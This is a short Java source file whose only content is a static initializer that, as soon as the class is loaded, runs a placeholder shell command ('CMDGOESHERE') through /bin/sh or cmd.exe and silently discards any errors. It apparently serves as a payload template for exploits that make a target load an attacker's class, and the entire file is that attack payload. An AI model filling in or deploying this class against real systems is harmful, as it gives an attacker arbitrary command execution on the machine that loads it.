import java.io.IOException;
import java.io.File;

public class Main {
    static {
        try {
            String[] cmdarray;
            if (File.separator.equals("/")) {
                cmdarray = new String[] { "/bin/sh", "-c", "CMDGOESHERE" };
            }
            else {
                cmdarray = new String[] { "cmd", "/C", "CMDGOESHERE" };
            }
            try {
                Runtime.getRuntime().exec(cmdarray);
            }
            catch (IOException ex) {
                ex.printStackTrace();
            }


        } catch (Exception e) {

        }
    }
}
